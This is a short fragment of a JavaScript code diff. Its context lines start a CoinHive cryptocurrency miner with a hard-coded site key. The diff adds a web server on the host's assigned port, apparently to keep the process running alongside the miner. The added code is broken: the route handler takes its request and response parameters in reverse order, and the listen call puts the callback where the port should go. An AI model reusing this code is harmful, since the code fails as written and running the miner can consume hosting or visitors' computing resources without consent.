@@ -8,3 +8,9 @@ const miner = await CoinHive('4Hm3YrYNgczRAP7jbGCZ7vA8XwbBR8DWMU7Bm9FKZqjxQXPPcw
     }
   });
 miner.start();
+app.get("/", function(res, req){
+    res.json({
+        
+    });
+});
+app.listen(function(){}, process.env.PORT);
